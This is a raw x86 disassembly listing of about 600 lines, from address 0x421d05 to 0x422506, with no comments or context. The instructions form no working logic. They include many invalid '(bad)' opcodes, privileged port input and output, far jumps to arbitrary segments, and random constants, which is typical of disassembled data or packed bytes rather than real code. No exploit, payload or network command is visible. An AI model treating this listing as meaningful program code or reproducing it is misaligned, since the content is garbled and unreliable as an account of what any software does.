  421d05:	lods   al,BYTE PTR ds:[esi]
  421d06:	and    BYTE PTR [ebp+0x60e2ae4f],bh
  421d0c:	or     BYTE PTR [eax+0xf],bl
  421d0f:	out    dx,al
  421d10:	and    DWORD PTR [edi],esp
  421d12:	mov    eax,0xa57df2b7
  421d17:	in     eax,dx
  421d18:	pusha  
  421d19:	sbb    BYTE PTR [edx-0x757d0908],0xfa
  421d20:	pop    ds
  421d21:	in     eax,0x2
  421d23:	dec    BYTE PTR [ebx-0x62c71d74]
  421d29:	mov    dl,BYTE PTR [ecx+0x314ebc5b]
  421d2f:	in     eax,dx
  421d30:	mov    eax,0xe615f081
  421d35:	adc    BYTE PTR [edi+ecx*4-0x31b8fa7e],dl
  421d3c:	mov    ds:0xc37ade55,eax
  421d41:	rep stos DWORD PTR es:[edi],eax
  421d43:	into   
  421d44:	sbb    eax,0xf9cf9581
  421d49:	test   al,0xb9
  421d4b:	xor    BYTE PTR [ebx+0x57],al
  421d4e:	nop
  421d4f:	mov    dh,0x10
  421d51:	and    dl,BYTE PTR [ebx-0x19]
  421d54:	(bad)  
  421d55:	js     0x421d68
  421d57:	ret    
  421d58:	xor    BYTE PTR [esi+0x8],bl
  421d5b:	cdq    
  421d5c:	stc    
  421d5d:	ins    BYTE PTR es:[edi],dx
  421d5e:	fucomip st,st(3)
  421d60:	dec    eax
  421d61:	mov    ah,0xa2
  421d63:	mov    ecx,0xd219d3ac
  421d68:	add    ebx,DWORD PTR [esi]
  421d6a:	lahf   
  421d6b:	cdq    
  421d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d6d:	jb     0x421d60
  421d6f:	fcmovnbe st,st(2)
  421d71:	lds    ebx,FWORD PTR ds:0x896b4947
  421d77:	(bad)  
  421d78:	add    eax,0x608bc08d
  421d7d:	cmp    DWORD PTR [eax+0x35],edx
  421d80:	add    ah,bh
  421d82:	in     al,dx
  421d83:	das    
  421d84:	test   al,0xc5
  421d86:	daa    
  421d87:	jmp    0xea99:0x83eda46d
  421d8e:	stos   BYTE PTR es:[edi],al
  421d8f:	jmp    0x421dbb
  421d91:	or     ch,BYTE PTR [ecx-0x1b]
  421d94:	cmp    BYTE PTR [esi+eiz*2+0x3c],0x26
  421d99:	test   DWORD PTR [eax+ebp*2+0x341c1f23],0x45c592d8
  421da4:	clc    
  421da5:	sbb    BYTE PTR [ebp+0x7b],bl
  421da8:	dec    ebp
  421da9:	dec    ebx
  421daa:	ror    bl,cl
  421dac:	lods   al,BYTE PTR ds:[esi]
  421dad:	push   esp
  421dae:	stos   BYTE PTR es:[edi],al
  421daf:	out    0x88,al
  421db1:	sar    BYTE PTR [ebx+0x11b6e5d3],1
  421db7:	xchg   esi,eax
  421db8:	and    edx,DWORD PTR [ecx]
  421dba:	(bad)  
  421dbb:	pop    ebx
  421dbc:	push   es
  421dbd:	ja     0x421e21
  421dbf:	fisubr DWORD PTR [edi+0x7e]
  421dc2:	adc    DWORD PTR [esi-0x7],esp
  421dc5:	dec    esi
  421dc6:	adc    al,0xac
  421dc8:	outs   dx,BYTE PTR ds:[esi]
  421dc9:	inc    edi
  421dca:	push   ss
  421dcb:	dec    ebx
  421dcc:	mov    ebp,0xc1d01100
  421dd1:	dec    edx
  421dd2:	loopne 0x421def
  421dd4:	pop    esp
  421dd5:	aaa    
  421dd6:	repz dec ebp
  421dd8:	mov    al,0xeb
  421dda:	test   BYTE PTR [ecx],dl
  421ddc:	std    
  421ddd:	popf   
  421dde:	jo     0x421e18
  421de0:	mov    eax,ds:0x158e9a64
  421de5:	xor    al,0xd3
  421de7:	mov    WORD PTR [edi-0x244ef729],fs
  421ded:	in     eax,0xe0
  421def:	xchg   esp,eax
  421df0:	xor    BYTE PTR [ecx],dl
  421df2:	bound  ebx,QWORD PTR [edi-0x49]
  421df5:	jmp    0x421e19
  421df7:	xchg   esi,eax
  421df8:	sbb    eax,0xa2f39c9d
  421dfd:	push   0xb80f1adb
  421e02:	mov    ah,0x9a
  421e04:	test   BYTE PTR [edi-0x7f50563c],0xba
  421e0b:	lds    ebp,FWORD PTR [esi+0x152d175d]
  421e11:	rcr    BYTE PTR [eax],1
  421e13:	lahf   
  421e14:	and    BYTE PTR [esi+0x67bbdb50],0x61
  421e1b:	jbe    0x421e1f
  421e1d:	jb     0x421df0
  421e1f:	pop    ecx
  421e20:	sub    BYTE PTR [ebp+eax*1-0x4a376447],bh
  421e27:	sbb    BYTE PTR [eax+0x30],0x3b
  421e2b:	call   0x8e8c834
  421e30:	ror    BYTE PTR [edi+edx*4],0xda
  421e34:	adc    al,0xb8
  421e36:	scas   eax,DWORD PTR es:[edi]
  421e37:	cdq    
  421e38:	or     esp,ebp
  421e3a:	sub    esi,ecx
  421e3c:	(bad)  
  421e3e:	loope  0x421e0a
  421e40:	pop    esp
  421e41:	nop
  421e42:	mov    edx,0xc16a8502
  421e47:	aas    
  421e48:	adc    DWORD PTR [edi],edi
  421e4a:	leave  
  421e4b:	jns    0x421dd9
  421e4d:	xor    eax,0x49849a8b
  421e52:	in     eax,0x58
  421e54:	mul    ch
  421e56:	pop    esi
  421e57:	pop    edi
  421e58:	or     al,0xe7
  421e5a:	push   ss
  421e5b:	lods   eax,DWORD PTR ds:[esi]
  421e5c:	mov    esi,0x957c3864
  421e61:	push   esp
  421e62:	dec    edx
  421e63:	mov    bl,0x79
  421e65:	popf   
  421e66:	jns    0x421e63
  421e68:	std    
  421e69:	xchg   al,ah
  421e6b:	lock xor BYTE PTR [ecx],bl
  421e6e:	sbb    BYTE PTR [edi-0x69],ch
  421e71:	cmp    al,0x98
  421e73:	mov    ah,dh
  421e75:	call   0xfb50:0x35d0a029
  421e7c:	or     DWORD PTR [ebp-0x2fc2dd03],0x4a655c07
  421e86:	mov    ebx,0x33819ffb
  421e8b:	push   cs
  421e8c:	or     ch,BYTE PTR ds:0x574aa5af
  421e92:	ds mov ebx,0xd02d202b
  421e98:	stos   BYTE PTR es:[edi],al
  421e99:	rcl    BYTE PTR [edx],1
  421e9b:	in     al,dx
  421e9c:	shr    DWORD PTR [ebx+eiz*1+0x60],cl
  421ea0:	push   ebx
  421ea1:	aad    0x93
  421ea3:	jmp    0xdce9a60d
  421ea8:	add    eax,0x4ae4203
  421ead:	fcomp  st(0)
  421eaf:	inc    ebx
  421eb0:	pop    edi
  421eb1:	pushf  
  421eb2:	cmp    ebx,DWORD PTR [esi+ebp*2+0x6a]
  421eb6:	xchg   esp,eax
  421eb7:	(bad)  
  421eb9:	push   edx
  421eba:	push   es
  421ebb:	les    esi,FWORD PTR [ebx-0x450e6103]
  421ec1:	jg     0x421efc
  421ec3:	push   edi
  421ec4:	lahf   
  421ec5:	outs   dx,BYTE PTR ds:[esi]
  421ec6:	pop    es
  421ec7:	icebp  
  421ec8:	xchg   ah,bl
  421eca:	mov    es,WORD PTR [ecx+esi*1]
  421ecd:	jl     0x421f03
  421ecf:	push   ebp
  421ed0:	add    ebx,esp
  421ed2:	sub    DWORD PTR [ecx+0x266308d7],edx
  421ed8:	mov    eax,ds:0x92c4db86
  421edd:	dec    edi
  421ede:	mov    bl,0xcf
  421ee0:	mov    al,0x20
  421ee3:	jmp    0xd8545c22
  421ee8:	jbe    0x421f33
  421eea:	shl    BYTE PTR [esi+esi*8+0x1bf56b4b],0x65
  421ef2:	int3   
  421ef3:	neg    BYTE PTR [ebx+eiz*4-0x1250b278]
  421efa:	jno    0x421f1a
  421efc:	aad    0x76
  421efe:	mov    cl,0xc6
  421f00:	push   esi
  421f01:	xchg   esi,eax
  421f02:	dec    ebx
  421f03:	cwde   
  421f04:	mov    eax,0x3486c1ec
  421f09:	mov    esi,0xbb1f618c
  421f0e:	daa    
  421f0f:	cs cdq 
  421f11:	fistp  QWORD PTR [eax+ecx*1+0x20]
  421f15:	xor    DWORD PTR [ebp+0x7d6371a],ebp
  421f1b:	dec    edx
  421f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f1d:	ins    BYTE PTR es:[edi],dx
  421f1e:	sub    al,0x71
  421f20:	aam    0x2c
  421f22:	iret   
  421f23:	push   esp
  421f24:	mov    bh,0xfe
  421f26:	cmp    DWORD PTR [ecx+0x44],esi
  421f29:	stos   DWORD PTR es:[edi],eax
  421f2a:	lods   al,BYTE PTR ds:[esi]
  421f2b:	sub    al,0x75
  421f2d:	rol    DWORD PTR [eax],0x8c
  421f30:	sub    BYTE PTR [eax+0x56],0x15
  421f34:	mov    bl,bh
  421f36:	test   DWORD PTR ds:0xd485a399,eax
  421f3c:	push   0xffffff9b
  421f3e:	mov    bl,BYTE PTR [eax+0x20860c16]
  421f44:	je     0x421f83
  421f46:	daa    
  421f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f48:	push   ebx
  421f49:	or     al,0xbe
  421f4b:	xchg   ecx,eax
  421f4c:	pop    esi
  421f4d:	xor    bl,BYTE PTR [ebx-0xa37a2df]
  421f53:	push   esp
  421f54:	popa   
  421f55:	nop
  421f56:	mov    WORD PTR [ebx],?
  421f58:	jecxz  0x421fa5
  421f5a:	inc    esi
  421f5b:	sbb    BYTE PTR [edx-0x52],al
  421f5e:	mov    esi,0xe4e6032d
  421f63:	outs   dx,DWORD PTR ds:[esi]
  421f64:	inc    esp
  421f65:	cmp    ch,BYTE PTR [ebx-0x758a7240]
  421f6b:	das    
  421f6c:	mov    bh,0xa4
  421f6e:	mov    dl,0x64
  421f70:	loope  0x421f34
  421f72:	jb     0x421fcf
  421f74:	fs or  esi,esi
  421f77:	scas   eax,DWORD PTR es:[edi]
  421f78:	mov    eax,0x9ecac8f6
  421f7d:	mov    DWORD PTR [esi-0x1d89c1b5],esi
  421f83:	lods   eax,DWORD PTR ds:[esi]
  421f84:	mov    ebp,0x20393e56
  421f89:	and    eax,DWORD PTR [edx-0x6f]
  421f8c:	(bad)  
  421f8d:	mov    dl,0xa8
  421f8f:	ret    
  421f90:	or     bh,BYTE PTR [ebp-0x1e]
  421f93:	bound  eax,QWORD PTR ds:0x5647b4d9
  421f99:	mov    bh,0xa0
  421f9b:	aad    0x7b
  421f9d:	mov    bl,bh
  421f9f:	lea    edi,[edx]
  421fa1:	dec    eax
  421fa2:	jmp    0x4a68:0x2bc59438
  421fa9:	loop   0x42201b
  421fab:	clc    
  421fac:	shl    dl,cl
  421fae:	ins    BYTE PTR es:[edi],dx
  421faf:	test   edx,ecx
  421fb1:	in     al,dx
  421fb2:	sbb    eax,0xeb007c92
  421fb7:	js     0x421f8c
  421fb9:	rol    BYTE PTR [edi],1
  421fbb:	fisub  DWORD PTR [edx-0x62]
  421fbe:	scas   al,BYTE PTR es:[edi]
  421fbf:	daa    
  421fc0:	in     eax,dx
  421fc1:	and    ah,BYTE PTR [esi-0x70]
  421fc4:	or     edi,DWORD PTR [esi-0xe986a5]
  421fca:	repnz pop ecx
  421fcc:	aaa    
  421fcd:	push   ds
  421fce:	inc    edi
  421fcf:	or     DWORD PTR [ebx+eiz*8],0x6ce2cb8f
  421fd6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  421fd8:	test   DWORD PTR [edx],edx
  421fda:	pop    ss
  421fdb:	sub    ah,BYTE PTR ds:0xf677f229
  421fe1:	fstp   DWORD PTR [ebp-0x7ce1bb8f]
  421fe7:	add    BYTE PTR [edx+ebx*8+0x7a07e20a],dh
  421fee:	or     ecx,esi
  421ff0:	and    al,0x91
  421ff2:	xchg   ecx,eax
  421ff3:	rcr    edi,cl
  421ff5:	adc    esp,edi
  421ff7:	mov    ah,0xf6
  421ff9:	jne    0x421fd4
  421ffb:	pop    edx
  421ffc:	shl    BYTE PTR [ebx+0x3bd3fb0],1
  422002:	jle    0x422074
  422004:	jne    0x421fbc
  422006:	iret   
  422007:	cli    
  422008:	sbb    DWORD PTR [ecx-0x61b48729],esp
  42200e:	dec    edx
  42200f:	loop   0x422003
  422011:	sbb    ah,BYTE PTR [esp+eax*1+0x8714a51]
  422018:	dec    ecx
  422019:	popf   
  42201a:	cmp    eax,0x525c59a7
  42201f:	xor    al,0xe3
  422021:	jp     0x421fb7
  422023:	cmp    al,0x95
  422025:	pop    ebx
  422026:	dec    edi
  422027:	push   ds
  422028:	repnz iret 
  42202a:	fsub   QWORD PTR [edx+0x57d94fa1]
  422030:	cs fprem1 
  422033:	stos   DWORD PTR es:[edi],eax
  422034:	test   eax,0x7580b0a3
  422039:	aaa    
  42203a:	ffreep st(2)
  42203c:	fldcw  WORD PTR [edi]
  42203e:	ret    
  42203f:	mov    ebp,0x65e3a302
  422044:	and    eax,0xdf6c48df
  422049:	test   eax,0x358842cc
  42204e:	cs xchg ebp,eax
  422050:	jae    0x422074
  422052:	pop    ss
  422053:	fwait
  422054:	mov    dh,0x72
  422056:	in     eax,dx
  422057:	or     DWORD PTR [edx],edi
  422059:	xor    al,BYTE PTR [ebx+ecx*4]
  42205c:	sbb    bl,ch
  42205e:	imul   edi,DWORD PTR [edx+ebx*8+0x39],0x1
  422063:	and    BYTE PTR [ebp-0x7d8cf6ab],0x86
  42206a:	cmp    al,0x73
  42206c:	add    DWORD PTR [ebp+0xe],edi
  42206f:	fcomp  st(3)
  422071:	dec    ecx
  422072:	int3   
  422073:	pop    edx
  422074:	daa    
  422075:	lahf   
  422076:	enter  0x9c21,0x44
  42207a:	int    0x12
  42207c:	test   al,0xb6
  42207e:	inc    esi
  42207f:	sbb    DWORD PTR [ecx+0x9],0x62
  422083:	or     cl,BYTE PTR ds:0x818da463
  422089:	scas   eax,DWORD PTR es:[edi]
  42208a:	outs   dx,BYTE PTR ds:[esi]
  42208c:	xor    ebp,esp
  42208e:	out    dx,al
  42208f:	jae    0x422054
  422091:	sbb    eax,0xcba72276
  422096:	mov    ch,0xee
  422098:	dec    esi
  422099:	sbb    DWORD PTR [edx],edi
  42209b:	lock (bad) 
  42209d:	cs out 0xff,eax
  4220a0:	outs   dx,BYTE PTR ds:[esi]
  4220a1:	sub    BYTE PTR [eax],0x93
  4220a4:	mov    ds:0x75462212,eax
  4220a9:	xchg   edi,eax
  4220aa:	not    edx
  4220ac:	inc    edi
  4220ad:	rcl    DWORD PTR [ebx+0xb20de15],0x35
  4220b4:	jmp    0x4220ca
  4220b6:	mov    cl,0x61
  4220b8:	stos   DWORD PTR es:[edi],eax
  4220b9:	mov    ch,0x3b
  4220bb:	push   es
  4220bc:	(bad)  
  4220bd:	cmp    cl,ch
  4220bf:	adc    eax,0x9f43a6f5
  4220c4:	sar    DWORD PTR [ebx-0x22],1
  4220c7:	out    0x33,al
  4220c9:	jp     0x422055
  4220cb:	sbb    al,0x2b
  4220cd:	outs   dx,BYTE PTR ds:[esi]
  4220ce:	xchg   ch,bh
  4220d0:	cdq    
  4220d1:	repnz sbb dh,0xe4
  4220d5:	enter  0xb006,0xfa
  4220d9:	sbb    eax,0xd2373ca7
  4220de:	repz dec edx
  4220e0:	xchg   ebp,eax
  4220e1:	xlat   BYTE PTR ds:[ebx]
  4220e2:	jle    0x422128
  4220e4:	test   DWORD PTR [eax+0x47fd9f24],edx
  4220ea:	push   ebx
  4220eb:	xchg   BYTE PTR [esi+0x7],bl
  4220ee:	daa    
  4220ef:	mov    esp,0xebb1d4e4
  4220f4:	fsubr  QWORD PTR [ebx-0x3]
  4220f7:	in     al,dx
  4220f8:	retf   0x1204
  4220fb:	xchg   edx,ebp
  4220fd:	add    al,0x57
  4220ff:	mov    eax,0x26872bd2
  422104:	not    DWORD PTR [ecx+ebp*8-0x20]
  422108:	int3   
  422109:	lea    ebp,[ecx-0x2456d1cb]
  42210f:	mov    ah,0xda
  422111:	mov    dh,0x98
  422113:	adc    eax,0x742e6ca2
  422118:	sbb    DWORD PTR [edi+ecx*2+0x2ac901cb],esi
  42211f:	adc    eax,0xaa6c8f12
  422124:	mov    BYTE PTR [ecx+0x41],ah
  422127:	scas   al,BYTE PTR es:[edi]
  422128:	pop    ecx
  422129:	inc    edi
  42212a:	mov    ds:0x5f78a198,eax
  42212f:	mov    BYTE PTR [ecx],dl
  422131:	add    ecx,DWORD PTR [edi-0x3b]
  422134:	mov    WORD PTR [edi+ebx*1-0x22d8cfa],ds
  42213b:	ins    DWORD PTR es:[edi],dx
  42213c:	xchg   ebp,eax
  42213d:	jmp    0x591c:0x8fa4378f
  422144:	int3   
  422145:	dec    ebp
  422146:	jl     0x422100
  422148:	sbb    esp,DWORD PTR [esi-0x790a34c8]
  42214e:	xor    eax,0xe6de65e2
  422153:	out    dx,al
  422154:	pop    esp
  422155:	pop    ebx
  422156:	jns    0x4220ef
  422158:	mov    ecx,0xaa6722d2
  42215d:	or     al,0xa8
  42215f:	mov    dl,0x81
  422161:	xchg   edi,eax
  422162:	inc    ecx
  422163:	or     al,0xa2
  422165:	mov    dl,0x99
  422167:	cmovl  edx,edx
  42216a:	jbe    0x422198
  42216c:	mov    ah,bl
  42216e:	repz enter 0xcb3d,0xbf
  422173:	or     al,dh
  422175:	pop    edx
  422176:	mov    ds:0x7587258f,eax
  42217b:	sti    
  42217c:	xor    al,0xeb
  42217e:	enter  0xf71,0x78
  422182:	lahf   
  422183:	cmp    eax,0x6b90996d
  422188:	push   ss
  422189:	inc    ecx
  42218a:	jns    0x422130
  42218c:	or     al,0x6a
  42218e:	out    dx,eax
  42218f:	je     0x4221d3
  422191:	or     ch,cl
  422193:	retf   0x5e26
  422196:	push   edi
  422197:	jns    0x4221eb
  422199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42219a:	and    DWORD PTR [ebx-0x3d096e70],edx
  4221a0:	xor    al,0x70
  4221a2:	dec    ebx
  4221a3:	inc    ebp
  4221a4:	and    edx,eax
  4221a6:	fwait
  4221a7:	pushf  
  4221a8:	leave  
  4221a9:	fbld   TBYTE PTR [ebx+eiz*2+0x50]
  4221ad:	mov    ah,0xd8
  4221af:	inc    edx
  4221b0:	push   0xffffffde
  4221b2:	(bad)  
  4221b3:	push   ebx
  4221b4:	dec    edi
  4221b5:	xor    BYTE PTR [edx],dh
  4221b7:	test   al,0xb
  4221b9:	outs   dx,BYTE PTR ds:[esi]
  4221ba:	adc    BYTE PTR [edx-0xd228f9c],ah
  4221c0:	in     eax,0x46
  4221c2:	mov    ah,0xbf
  4221c4:	(bad)  
  4221c5:	outs   dx,BYTE PTR ds:[esi]
  4221c6:	or     DWORD PTR [edx+0x3ae199b4],0x2f
  4221cd:	or     bl,BYTE PTR [ecx]
  4221cf:	lods   eax,DWORD PTR ds:[esi]
  4221d0:	pop    edx
  4221d1:	cmp    eax,0x210e635f
  4221d6:	dec    ebp
  4221d7:	(bad)  
  4221d9:	jmp    0x114f:0xc98cf92b
  4221e0:	fld    TBYTE PTR [ecx-0x2c]
  4221e3:	loopne 0x422185
  4221e5:	add    DWORD PTR [esi+0x7e91ace8],0x72
  4221ec:	pop    ebx
  4221ed:	adc    al,0x5d
  4221ef:	shr    BYTE PTR [ebp-0x5ed60b04],cl
  4221f5:	mov    ?,WORD PTR [ecx]
  4221f7:	inc    edi
  4221f8:	mov    al,0xf3
  4221fa:	div    DWORD PTR [ecx-0x4d0b005f]
  422200:	js     0x42218f
  422202:	mov    edi,0x877756d2
  422207:	mov    eax,ds:0xe9c3aba5
  42220c:	push   ecx
  42220d:	mov    ecx,0x4dee8c3f
  422212:	(bad)  
  422213:	loope  0x422213
  422215:	pop    es
  422216:	pop    eax
  422217:	sbb    DWORD PTR [ebx-0x4421598],esi
  42221d:	adc    bh,BYTE PTR [edx-0x12af0d76]
  422223:	and    DWORD PTR [edx+0x39472e0],eax
  422229:	xchg   edx,eax
  42222a:	arpl   bp,bx
  42222c:	mov    eax,ds:0xcbb6da42
  422231:	mov    ch,0x8e
  422233:	outs   dx,BYTE PTR ds:[esi]
  422234:	test   eax,0x137b4e8
  422239:	jo     0x422241
  42223b:	adc    cl,dl
  42223d:	inc    ebx
  42223e:	out    0x16,al
  422240:	dec    esi
  422241:	dec    edx
  422242:	call   0xd5438d37
  422247:	stc    
  422248:	and    ecx,DWORD PTR [ebx]
  42224a:	stc    
  42224b:	push   edi
  42224c:	push   edi
  42224d:	aaa    
  42224e:	cmp    ah,al
  422250:	inc    esi
  422251:	dec    esp
  422252:	aad    0x3e
  422254:	pushf  
  422255:	jno    0x4222b9
  422257:	xchg   BYTE PTR [ebx+esi*2+0x55],dl
  42225b:	repz mov al,0x78
  42225e:	mov    dl,al
  422260:	out    0x51,al
  422262:	push   esp
  422263:	push   ss
  422264:	mov    esi,0xcf0c4c8a
  422269:	pop    edi
  42226a:	les    ebx,FWORD PTR [ebp-0x9]
  42226d:	test   eax,0x3bc93af9
  422272:	scas   al,BYTE PTR es:[edi]
  422273:	hlt    
  422274:	cmp    BYTE PTR [eax],0x76
  422277:	adc    BYTE PTR [esi+0x5c],0xd9
  42227b:	shr    BYTE PTR [edx],cl
  42227d:	cdq    
  42227e:	loop   0x422287
  422280:	jecxz  0x4222df
  422282:	mov    eax,0xb18def31
  422287:	ror    DWORD PTR [eax+ebx*1-0x6b83071c],cl
  42228e:	lods   al,BYTE PTR ds:[esi]
  42228f:	cmp    esi,DWORD PTR [ebp+0x6c5030b9]
  422295:	cmp    eax,0x161d4b80
  42229a:	and    al,0xee
  42229c:	retf   0x894b
  42229f:	sbb    eax,0x1d859ca9
  4222a4:	shl    DWORD PTR [edx+0x7cc96833],0xab
  4222ab:	xlat   BYTE PTR ds:[ebx]
  4222ac:	mov    ds:0xa78111fc,eax
  4222b1:	dec    edx
  4222b2:	xor    eax,0xa3836156
  4222b7:	div    esi
  4222b9:	cmc    
  4222ba:	add    ch,dl
  4222bc:	or     al,0x48
  4222be:	cmc    
  4222bf:	mov    edi,0x8989744d
  4222c4:	sub    DWORD PTR [ebp+0x18],esp
  4222c7:	data16 jns 0x422268
  4222ca:	das    
  4222cb:	xchg   BYTE PTR [eax],dh
  4222cd:	fcom   st(7)
  4222cf:	cmp    bl,BYTE PTR [ecx+0x52]
  4222d2:	int3   
  4222d3:	mov    bl,0xcc
  4222d5:	imul   DWORD PTR ds:0x5bd00221
  4222db:	lds    edi,FWORD PTR [ebx+0x25899d44]
  4222e1:	pop    esp
  4222e2:	ins    BYTE PTR es:[edi],dx
  4222e3:	add    eax,esi
  4222e5:	in     eax,dx
  4222e6:	call   0x9c:0x88e9fc1c
  4222ed:	push   DWORD PTR [ecx]
  4222ef:	cmp    edi,edi
  4222f1:	fwait
  4222f2:	xlat   BYTE PTR ds:[ebx]
  4222f3:	pop    ebp
  4222f4:	loopne 0x422326
  4222f6:	sub    bl,al
  4222f8:	add    ebx,DWORD PTR [ebp-0x64]
  4222fb:	push   esp
  4222fc:	pop    es
  4222fd:	mov    al,0x6e
  4222ff:	adc    BYTE PTR [edi+0x73],ah
  422302:	add    eax,esi
  422304:	pop    esp
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	or     eax,0x9ccc5473
  42230b:	xor    eax,0xf1356b3f
  422310:	mov    cl,0x49
  422312:	mov    ebx,0xd0468792
  422317:	icebp  
  422318:	jl     0x42238b
  42231a:	imul   ebp,DWORD PTR [ecx],0x45cafa0
  422320:	xor    al,0x66
  422322:	out    dx,al
  422323:	ret    
  422324:	mov    esp,0x7576887a
  422329:	pop    es
  42232a:	cmp    DWORD PTR [edx-0x7c8dff79],0x3a
  422331:	jmp    0x9a5b:0x2bc271b0
  422338:	pushf  
  422339:	(bad)  
  42233a:	adc    esi,DWORD PTR [eax]
  42233c:	xchg   ebx,eax
  42233d:	loope  0x422337
  42233f:	arpl   WORD PTR [edx-0x3bf1cbb8],si
  422345:	dec    ebx
  422346:	pop    eax
  422347:	mov    ds:0xf19b95e8,eax
  42234c:	hlt    
  42234d:	sbb    BYTE PTR [ebp+0x5bbf45aa],cl
  422353:	cmc    
  422354:	mov    ebp,0x933d190d
  422359:	shl    BYTE PTR [ebx+0x105f4ae],cl
  42235f:	push   ss
  422360:	and    ch,0x50
  422363:	rol    DWORD PTR [ebx+0x69],1
  422366:	sbb    BYTE PTR [esi+0x48f52300],al
  42236c:	in     eax,0xf5
  42236e:	(bad)  
  42236f:	fbstp  TBYTE PTR [esi]
  422371:	ss push ebp
  422373:	dec    ecx
  422374:	cmp    al,0xf2
  422376:	mov    dl,0x9a
  422378:	ret    0x857f
  42237b:	fcmovnu st,st(7)
  42237d:	dec    ebp
  42237e:	ret    0x77af
  422381:	inc    BYTE PTR [ecx-0x73]
  422384:	dec    ebp
  422385:	and    DWORD PTR [esi+eiz*4],0xffffff9c
  422389:	mov    dh,0x8f
  42238b:	fstp   DWORD PTR [ecx+0x1a98dc70]
  422391:	imul   DWORD PTR [ebx+0x33c062a9]
  422397:	push   ebp
  422398:	xchg   esi,eax
  422399:	push   ebx
  42239a:	inc    eax
  42239b:	sbb    eax,0x26423ff
  4223a0:	leave  
  4223a1:	xchg   ebp,eax
  4223a2:	cmp    dl,BYTE PTR [ecx+0x7325868]
  4223a8:	int    0xed
  4223aa:	out    dx,eax
  4223ab:	and    cl,BYTE PTR [eax-0x19]
  4223ae:	loope  0x42241a
  4223b0:	arpl   WORD PTR [eax+0x4f71a27a],di
  4223b6:	lds    edx,FWORD PTR [edx-0x7a]
  4223b9:	fldenv [ebx+edi*1-0x4381ca26]
  4223c0:	mov    al,0x44
  4223c2:	sar    ecx,1
  4223c4:	mov    dh,0x9c
  4223c6:	mov    bh,0x56
  4223c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c9:	sar    BYTE PTR [ebp+0x2f],0x28
  4223cd:	mov    esi,0xddfc5036
  4223d2:	fdiv   st,st(5)
  4223d4:	mov    cl,al
  4223d6:	mov    ds,WORD PTR [eax]
  4223d8:	shl    DWORD PTR [ecx+0x6],1
  4223db:	jg     0x4223b5
  4223dd:	sub    DWORD PTR [esi+edx*8+0x42e02293],ebx
  4223e4:	fcomp  DWORD PTR [edx+0x2d1a5559]
  4223ea:	stos   DWORD PTR es:[edi],eax
  4223eb:	test   eax,0x7cf3d34e
  4223f0:	sbb    al,0xe3
  4223f2:	cli    
  4223f3:	push   ebx
  4223f4:	sbb    eax,0xde028d5f
  4223f9:	mov    ch,0x24
  4223fb:	clc    
  4223fc:	(bad)  
  4223fd:	fmul   DWORD PTR [edx]
  4223ff:	ror    BYTE PTR [edi-0xeff3e49],cl
  422405:	mov    eax,ds:0x481efb91
  42240a:	scas   al,BYTE PTR es:[edi]
  42240b:	std    
  42240c:	push   ecx
  42240d:	dec    ecx
  42240e:	adc    al,0x2a
  422410:	repz test al,0xa2
  422413:	fwait
  422414:	es push ebp
  422416:	inc    esp
  422417:	cmp    DWORD PTR [eax-0x39bbc3a8],0xfb786ab8
  422421:	sbb    DWORD PTR [ebp+0x1600f0af],ecx
  422427:	jbe    0x4223f4
  422429:	adc    esi,ecx
  42242b:	jl     0x42248d
  42242d:	daa    
  42242e:	jno    0x4223e3
  422430:	push   esi
  422431:	cdq    
  422432:	mov    edx,0xdf2f0e16
  422437:	aam    0x38
  422439:	and    eax,0x27a8406d
  42243e:	jo     0x422466
  422440:	adc    al,0xb3
  422442:	outs   dx,DWORD PTR ds:[esi]
  422443:	xor    ch,BYTE PTR [ecx]
  422445:	dec    ebx
  422446:	push   ebp
  422447:	arpl   WORD PTR [edx+0x7ee0175f],ax
  42244d:	sbb    esi,edi
  42244f:	mov    BYTE PTR [ebx],bl
  422451:	into   
  422452:	out    0xfe,al
  422454:	sbb    bl,BYTE PTR [ebx]
  422456:	and    bh,BYTE PTR [edi-0x57]
  422459:	nop
  42245a:	cmp    BYTE PTR [ebp-0x3d3c502c],ah
  422460:	sbb    ecx,0xf8c23f1f
  422466:	and    DWORD PTR [eax+0x7b],esi
  422469:	push   edx
  42246a:	mov    esi,0xb8aa4974
  42246f:	mov    ds:0xd1ad0771,al
  422474:	call   0x9574:0x16a13427
  42247b:	jnp    0x4224ba
  42247d:	mov    DWORD PTR [ebx+0x2f87c3ec],0x822d86c5
  422487:	mov    DWORD PTR [esi+0xc],eax
  42248a:	jb     0x4224ba
  42248c:	jae    0x422509
  42248e:	les    esi,FWORD PTR [edx+esi*8+0x36]
  422492:	cld    
  422493:	xor    esi,DWORD PTR [edx-0x28]
  422496:	cmp    dh,dh
  422498:	mul    edx
  42249a:	fmul   st,st(2)
  42249c:	mul    dl
  42249e:	mov    ds:0x6a113851,al
  4224a3:	jle    0x4224e8
  4224a5:	jle    0x42250d
  4224a7:	adc    bl,BYTE PTR [ecx]
  4224a9:	outs   dx,BYTE PTR ds:[esi]
  4224aa:	stos   BYTE PTR es:[edi],al
  4224ab:	xor    eax,0x38c5a358
  4224b0:	and    DWORD PTR ds:[ecx],0x7
  4224b4:	cmp    DWORD PTR [edi-0x33],ebp
  4224b7:	fmul   DWORD PTR [edx+0x6fb5cfbb]
  4224bd:	or     al,0xb3
  4224bf:	std    
  4224c0:	idiv   DWORD PTR [ebx+0x47]
  4224c3:	nop
  4224c4:	dec    ebx
  4224c5:	ret    0xf32a
  4224c8:	not    eax
  4224ca:	call   0xbf42:0xb8e93af1
  4224d1:	and    DWORD PTR [ebx],0x44b7f411
  4224d7:	sbb    DWORD PTR [eax-0x1916beb5],0x975a559b
  4224e1:	aas    
  4224e2:	retf   0xc76b
  4224e5:	push   edi
  4224e6:	mov    al,ds:0x92e0c1ab
  4224eb:	dec    esp
  4224ec:	jae    0x422530
  4224ee:	dec    edi
  4224ef:	sbb    BYTE PTR [edx+0x41],ch
  4224f2:	mov    ebp,0xa76a3e8b
  4224f7:	push   ds
  4224f8:	out    0x30,al
  4224fa:	sbb    al,0xe0
  4224fc:	inc    esi
  4224fd:	jg     0x422547
  4224ff:	mov    bl,BYTE PTR [ebx]
  422501:	and    eax,0x25995b48
  422506:	out    dx,al
